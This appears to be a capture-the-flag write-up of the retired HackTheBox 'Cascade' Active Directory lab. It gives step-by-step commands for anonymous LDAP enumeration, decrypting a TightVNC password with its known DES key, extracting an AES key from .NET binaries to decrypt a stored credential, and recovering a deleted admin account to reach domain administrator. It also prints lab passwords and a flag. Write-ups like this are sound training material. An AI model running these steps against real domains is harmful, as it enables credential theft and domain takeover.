# CASCADE - Medium

**Date Started:** June 9, 2026
**Date Completed:** June 10, 2026
**Difficulty:** Medium
**Platform:** HackTheBox (retired)
**Tags:** Active Directory, LDAP enumeration, TightVNC decrypt, .NET reversing, AD Recycle Bin
**Status:** ✅ COMPLETE

---

## Summary / Attack Chain

First medium box — same credential-ladder model as the easy boxes, but with **four** credential pivots instead of one or two. Every tier unlocks a new data source; every data source contains the next credential in a different format (base64, encrypted VNC, AES-encrypted in SQLite, base64 in a deleted AD object).

```
LDAP anonymous bind → r.thompson (cascadeLegacyPwd, base64)
  → Data share → TightVNC registry export → s.smith (VNC DES-encrypted password)
    → user flag + Audit$ share → CascAudit.exe + CascCrypto.dll
      → reverse .NET → AES key/IV → decrypt SQLite → arksvc
        → AD Recycle Bin → recover TempAdmin → cascadeLegacyPwd (base64)
          → "same password as admin" → Administrator → root
```

**New techniques vs Easy boxes:** LDAP anonymous enumeration, TightVNC password decryption (DES with published key), .NET binary reversing (monodis/strings → AES key extraction), AD Recycle Bin object recovery.

---

## Phase 1 — Enumeration

```bash
nmap -p- -Pn --min-rate 1000 -T4 <TARGET> -oN cascade_all_ports.txt
nmap -p 53,88,135,139,389,445,636,3268,3269,5985 -Pn -sC -sV <TARGET> -oN cascade_services.txt
```

**Findings / reads:**
- **DC fingerprint** (53/88/389/636/3268/3269/445) — Domain Controller.
- **Domain: `cascade.local`**, Host: `CASC-DC1`.
- **Windows Server 2008 R2 SP1** — old OS, expect AD misconfigs and legacy features.
- **Port 5985 (WinRM)** — open, evil-winrm available if we get a credential + group membership.
- **Port 389 (LDAP)** — on a 2008 R2 DC, anonymous LDAP binds are often permitted.
- SMB signing required — relay off the table.
- `-Pn` needed — host was blocking ICMP probes during scan (pings worked separately).

```bash
echo "<TARGET> cascade.local CASC-DC1.cascade.local CASC-DC1" | sudo tee -a /etc/hosts
```

---

## Phase 2 — Null-Session + LDAP Enumeration

### SMB null session
```bash
nxc smb <TARGET> -u '' -p '' --shares    # shares: ACCESS_DENIED
nxc smb <TARGET> -u '' -p '' --users      # users: SUCCESS (15 users)
```

Null auth denied for shares but allowed for users. Key accounts: `arksvc`, `s.smith`, `r.thompson`, `util`, `BackupSvc` (service accounts stand out from `firstname.lastname` pattern).

### AS-REP Roast attempt
```bash
GetNPUsers.py cascade.local/ -dc-ip <TARGET> -usersfile users.txt -no-pass
```
All users protected — no pre-auth-disabled accounts. AS-REP path closed.

### LDAP anonymous bind (the pivot)
```bash
ldapsearch -x -H ldap://<TARGET> -b "dc=cascade,dc=local" "(objectClass=user)" | grep -i -E "sAMAccountName|description|pwd|pass|comment|info"
```

**Finding:** `r.thompson` has a custom attribute:
```
cascadeLegacyPwd: clk0bjVldmE=
```

Base64 decode:
```bash
echo 'clk0bjVldmE=' | base64 -d    # rY4n5eva
```

**`r.thompson : rY4n5eva`** — validated via `nxc smb`.

> **Lesson:** LDAP anonymous on older DCs returns full user attributes including custom fields. Admins store passwords in custom LDAP attributes thinking they're hidden — they're not. `ldapsearch` with broad attribute queries catches what SMB enumeration misses.

---

## Phase 3 — SMB Share Hunting → s.smith (TightVNC)

```bash
nxc smb <TARGET> -u r.thompson -p 'rY4n5eva' --shares
```
New access: **Data** (READ) and **Audit$** (no access yet — hidden share, note for later).

```bash
smbclient //<TARGET>/Data -U 'cascade.local\r.thompson%rY4n5eva' -c 'recurse ON; prompt OFF; mget *'
find . -type f
```

**Key finds:**
1. **`IT/Temp/s.smith/VNC Install.reg`** — TightVNC registry export with encrypted password:
   ```
   "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
   ```

2. **`IT/Email Archives/Meeting_Notes_June_2018.html`** — mentions TempAdmin account:
   > "Username is TempAdmin (password is the same as the normal admin account password)."

### Decrypt TightVNC password
TightVNC encrypts its stored password with a **hardcoded DES key** (same concept as GPP cpassword — published/known key makes it a decrypt, not a crack):

```bash
echo -n '6bcf2a4b6e5aca0f' | xxd -r -p | openssl des-ecb -nopad -d -K e84ad660c4721ae0 2>/dev/null; echo
```

**`s.smith : sT333ve2`** — validated via `nxc smb`, evil-winrm access confirmed (in Remote Management Users).

---

## Phase 4 — Shell + User Flag

```bash
evil-winrm -i <TARGET> -u s.smith -p 'sT333ve2'
```
```
*Evil-WinRM* PS> type C:\Users\s.smith\Desktop\user.txt
```

---

## Phase 5 — Audit$ Share → .NET Reversing → arksvc

s.smith can now read the **Audit$** hidden share:
```bash
smbclient //<TARGET>/Audit$ -U 'cascade.local\s.smith%sT333ve2' -c 'recurse ON; prompt OFF; mget *'
```

**Contents:**
- `CascAudit.exe` — .NET executable
- `CascCrypto.dll` — .NET crypto library
- `DB/Audit.db` — SQLite database
- `RunAudit.bat` — runs CascAudit.exe against the database

### SQLite database
```bash
sqlite3 Audit.db "SELECT * FROM Ldap;"
```
```
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

Base64 decode returns garbage → it's **AES-encrypted**, not just encoded. The key is inside CascCrypto.dll.

### Reverse the .NET binaries

.NET stores string literals as UTF-16LE. Extract them:
```bash
python3 -c "
import re
for f in ['CascCrypto.dll', 'CascAudit.exe']:
    data = open(f, 'rb').read()
    strings = re.findall(b'(?:[\x20-\x7e]\x00){3,}', data)
    print(f'--- {f} ---')
    for s in strings:
        print(s.decode('utf-16-le'))
"
```

**Extracted:**
- **IV:** `1tdyjCbY1Ix49842` (from CascCrypto.dll)
- **Key:** `c4scadek3y654321` (from CascAudit.exe)
- **Algorithm:** AES-128-CBC (16-byte key = 128-bit)

### Decrypt arksvc's password
```bash
echo -n 'BQO5l5Kj9MdErXx6Q6AGOw==' | base64 -d > /tmp/enc.bin
openssl enc -d -aes-128-cbc \
  -K "$(echo -n 'c4scadek3y654321' | xxd -p)" \
  -iv "$(echo -n '1tdyjCbY1Ix49842' | xxd -p)" \
  -in /tmp/enc.bin -nopad 2>/dev/null; echo
```

**`arksvc : w3lc0meFr31nd`** — validated, evil-winrm access confirmed.

> **Lesson:** .NET binaries decompile/reverse trivially. `monodis` for full IL disassembly, or extract UTF-16LE strings with Python to pull hardcoded keys without a decompiler. Devs who embed crypto keys in client-side binaries are handing you the key.

---

## Phase 6 — AD Recycle Bin → TempAdmin → DA

`arksvc` — **ark** = archive. The account name hints at its purpose: managing deleted/archived AD objects.

The email said TempAdmin had the **same password as the normal admin** and was deleted after 2018. AD Recycle Bin preserves deleted objects with all their attributes.

```powershell
Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects -Properties *
```

**TempAdmin found** with:
```
cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz
```

```bash
echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d    # baCT3r1aN00dles
```

Email said TempAdmin's password = admin's password:

```bash
nxc smb <TARGET> -u Administrator -p 'baCT3r1aN00dles'    # (Pwn3d!)
evil-winrm -i <TARGET> -u Administrator -p 'baCT3r1aN00dles'
```
```
*Evil-WinRM* PS> type C:\Users\Administrator\Desktop\root.txt
# eb9d80d986954ff3c9f6bd86ec8efa4c
```

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | *(s.smith Desktop — instance-specific)* |
| root.txt | `eb9d80d986954ff3c9f6bd86ec8efa4c` |

*(HTB flags rotate per spawn — these are instance-specific.)*

---

## Lessons / Exam Relevance

- **Same model, more layers** — the credential ladder is identical to the easy boxes (enumerate → find anomaly → cred → "what does it unlock?" → escalate). Medium just means more rungs.
- **LDAP anonymous enumeration** — on older DCs, anonymous LDAP binds return full user attributes. Custom attributes like `cascadeLegacyPwd` are invisible to SMB enumeration but exposed via LDAP. Always try `ldapsearch -x` on port 389.
- **Published-key decryption pattern** — GPP cpassword (AES, Microsoft's key), TightVNC (DES, hardcoded key), .NET embedded keys. The pattern: vendor/developer uses a "secret" key that's actually public. Recognize the format → Google the key → decrypt.
- **Reverse .NET binaries** — extract UTF-16LE string literals with Python regex, or use `monodis`/ILSpy for full decompilation. Hardcoded crypto keys in client-side binaries = free decryption.
- **AD Recycle Bin** — deleted objects retain their attributes (including custom password fields). If an account was deleted but Recycle Bin is enabled, `Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects -Properties *` recovers everything. Account name hints matter (`arksvc` = archive service).
- **Read everything, connect the dots** — the email about TempAdmin was found early (Data share) but only became actionable after recovering TempAdmin from the Recycle Bin four steps later. Take notes on everything; pieces connect later.
- **Hidden shares (`$` suffix)** — `Audit$` was invisible to anonymous enumeration and r.thompson. Each credential tier may unlock shares the previous one couldn't access. Re-check shares after every new credential.

## Cleanup / Changes Made

- No AD modifications made (read-only operations throughout).
- Downloaded Data share, Audit$ share contents, and SQLite database to attack host (loot).

